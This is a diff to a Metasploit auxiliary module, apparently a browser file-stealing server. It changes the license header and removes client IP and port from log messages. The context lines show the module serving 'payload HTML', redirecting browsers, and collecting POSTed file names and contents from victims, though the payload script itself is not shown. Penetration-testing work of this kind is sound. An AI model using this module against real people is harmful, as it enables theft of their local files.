@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -49,11 +49,11 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def on_request_uri(cli, request)
-		print_status("#{cli.peerhost}:#{cli.peerport} Request '#{request.method} #{request.uri}'")
+		print_status("Request '#{request.method} #{request.uri}'")
 		selected_headers = [ 'user-agent', 'origin', 'referer' ]
 		request.headers.each_key { |k|
 			next if not selected_headers.include? k.downcase
-			print_status("#{cli.peerhost}:#{cli.peerport} + #{k}: #{request.headers[k]}")
+			print_status("#{k}: #{request.headers[k]}")
 		}
 
 		return process_post(cli, request) if request.method == "POST"
@@ -108,7 +108,7 @@ uploadFiles(results);
 </html>
 EOS
 
-			print_status("#{cli.peerhost}:#{cli.peerport} Sending payload HTML ...")
+			print_status("Sending payload HTML ...")
 			send_response_html(cli, html,
 				{
 					'Cache-Control' => 'public',
@@ -133,7 +133,7 @@ setTimeout("document.location = '#{payload_fn}.html';", 500);
 </html>
 EOS
 
-			print_status("#{cli.peerhost}:#{cli.peerport} Sending initial HTML ...")
+			print_status("Sending initial HTML ...")
 			send_response_html(cli, html)
 
 		end
@@ -167,7 +167,7 @@ EOS
 			e = results[k]
 			fn = e[:filename]
 			data = e[:data]
-			print_good("#{cli.peerhost}:#{cli.peerport} ! #{fn.inspect} contains #{data.inspect}")
+			print_good("#{fn.inspect} contains #{data.inspect}")
 
 			fn.gsub!(/[\/\\]/, '.')
 			fn.gsub!(/^\./, '')
